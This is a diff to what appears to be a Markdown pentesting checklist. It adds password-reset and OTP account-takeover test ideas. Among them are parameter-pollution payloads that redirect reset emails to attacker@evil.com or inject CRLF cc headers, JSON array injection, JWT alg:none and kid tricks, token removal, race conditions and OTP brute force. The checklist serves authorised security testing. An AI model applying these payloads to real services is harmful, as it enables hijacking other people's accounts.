@@ -445,12 +445,43 @@ tax_rate=10&tax_exempt=yes
 >IMPORTANT FUNCTIONS 
 
 **RESET PASSWORD :**
-- [ ] 
-- [ ] 
-- [ ] 
-- [ ] 
-- [ ] 
+*WITH TOKEN :*
+- [ ] No rate limiting on `/forgot-password` endpoint
+- [ ] Change user_id in reset link: `/reset?token=XXX&user_id=ATTACKER_ID`
+- [ ] Change email parameter `/reset?token=XXX&email=attacker@evil.com`
+- [ ] Change username parameter if used
+- [ ] try parameter Pollution 
+ ```
+email=victim@gmail.com&email=attacker@gmail.com
+email=victim@gmail.com%20email=attacker@gmail.com
+email=victim@gmail.com|email=attacker@gmail.com
+email=victim@gmail.com%0d%0acc:attacker@gmail.com
+email=victim@gmail.com&code=<TOKEN>
+ ```
+- [ ] Send JSON array injection `{"email": ["victim@target.com", "attacker@evil.com"]}`
+- [ ] Check if you can change the user id 
+- [ ] try changing request method 
+- [ ] change the content type
+- [ ] try changing response to `200 OK`
+- [ ] check if you can encode or decrypt the token 
+- [ ] change you cookie to the victim cookie and try to change the password
+- [ ] Response body editing `{"success":false} → {"success":true}`
+- [ ] JWT token manipulation (alg:none, kid injection, weak secret)
+- [ ] try username like `username@your_domain_or_burp.com` maybe you got the like
+- [ ] check js files if you can find the function that can generate the token
+- [ ] Check if the Referer header is leaking the password reset token
+- [ ] check if you can use the same token many times (token never expired)
+- [ ] try to delete the token and change password without it 
+- [ ] try to change the token value to `token=AAAAAAAA` or delete it like `token=`
+- [ ] try to send many requests without the same victim info in the same second (race condition)
 
+*WITH OTP :*
+- [ ] check there is no rate limit for sending the otp 
+- [ ] check if no rate limit in otp (brute force to ato)
+- [ ] No OTP expiry or long expiry time
+- [ ] OTP bypass via null/empty value
+- [ ] change your id to the victim id
+- [ ] try special otp like `000000`
 
 
 
